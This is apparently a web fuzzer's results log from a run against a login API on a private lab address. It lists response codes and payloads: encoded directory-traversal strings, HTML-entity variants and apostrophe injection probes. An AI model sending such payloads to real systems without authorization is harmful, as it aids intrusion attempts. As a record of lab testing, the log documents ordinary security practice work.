Target: http://10.10.10.16/api/login
Total requests: 468
==============================================================================================================================================
ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Payload    
==============================================================================================================================================
00204:  0.049s   C=00204:  C=200      0 L	       2 W	     21 Ch                                                                              "..%c0%af"
00207:  0.049s   C=00207:  C=200      0 L	       2 W	     21 Ch                                                                              "..%5c"
00206:  0.049s   C=00206:  C=200      0 L	       2 W	     21 Ch                                                                              "..\"
00203:  0.051s   C=00203:  C=400      0 L	       2 W	     21 Ch                                                                              "..%u2215"
00200:  0.051s   C=00200:  C=200      0 L	       2 W	     21 Ch                                                                              "%2500"
00202:  0.050s   C=00202:  C=200      0 L	       2 W	     21 Ch                                                                              "%2e%2e%2f"
00237:  0.051s   C=00237:  C=400      0 L	       2 W	     21 Ch                                                                              "&#X3c"
00239:  0.051s   C=00239:  C=400      0 L	       2 W	     21 Ch                                                                              "&#X003c"
00243:  0.051s   C=00243:  C=400      0 L	       2 W	     21 Ch                                                                              "&#X3c;"
00251:  0.050s   C=00251:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x003C"
00286:  0.050s   C=00286:  C=200      0 L	       2 W	     21 Ch                                                                              "#&apos;"
00282:  0.049s   C=00282:  C=200      0 L	       2 W	     21 Ch                                                                              "@&apos;"
00267:  0.050s   C=00267:  C=400      0 L	       2 W	     21 Ch                                                                              "&#X3C;"
00285:  0.050s   C=00285:  C=200      0 L	       2 W	     21 Ch                                                                              "*&apos;"
00284:  0.050s   C=00284:  C=200      0 L	       2 W	     21 Ch                                                                              "[&apos;]"
00283:  0.049s   C=00283:  C=200      0 L	       2 W	     21 Ch                                                                              "{&apos;}"
00281:  0.051s   C=00281:  C=200      0 L	       2 W	     21 Ch                                                                              "^&apos;"
00279:  0.049s   C=00279:  C=200      0 L	       2 W	     21 Ch                                                                              "/&apos;"
00280:  0.050s   C=00280:  C=200      0 L	       2 W	     21 Ch                                                                              "\&apos;"
00278:  0.051s   C=00278:  C=400      0 L	       2 W	     21 Ch                                                                              "&apos;"
